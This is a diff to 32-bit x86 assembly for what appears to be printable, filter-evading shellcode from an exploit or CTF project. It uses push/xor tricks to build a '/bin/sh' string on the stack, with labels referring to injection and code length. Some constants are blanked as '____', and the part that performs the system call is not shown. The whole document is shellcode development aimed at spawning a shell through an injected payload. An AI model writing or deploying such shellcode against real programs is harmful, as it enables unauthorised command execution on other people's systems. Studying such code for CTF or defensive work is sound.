@@ -2,12 +2,14 @@ bits 32
 %include "include/all.asm"
 codelen equ inject-$
 
+start_listing:
     push eax ; push the eip, which is incidentally stored in eax
     pop edx
 
     push '____'
     pop eax
     xor eax, '____'
+    push eax
 
     push eax
     pop ecx
@@ -54,25 +56,24 @@ codelen equ inject-$
     push '____'
     pop eax
     xor eax, '____'
+    
 
     ; Push /bin/sh to the stack
-    ;push eax ; push 4 nul-bytes
     push '/sh0'
 
     ; moving esp to end of above string
     inc esp
     inc esp
     inc esp
-    inc esp ; now at '0'
+    inc esp ; now right after '0'
 
-    ; move additional 3 bytes to align 32-bit with the '0'
+    ; move additional 3 bytes to align '0' to be overwritten by pushing 4 bytes
     inc esp
     inc esp
     inc esp
+    push eax ; clear '0' (and the following 3 bytes)
 
-    ; clear '0' and the following 3 bytes
-    push eax
-
+    ; move back stack pointer
     dec esp
     dec esp
     dec esp
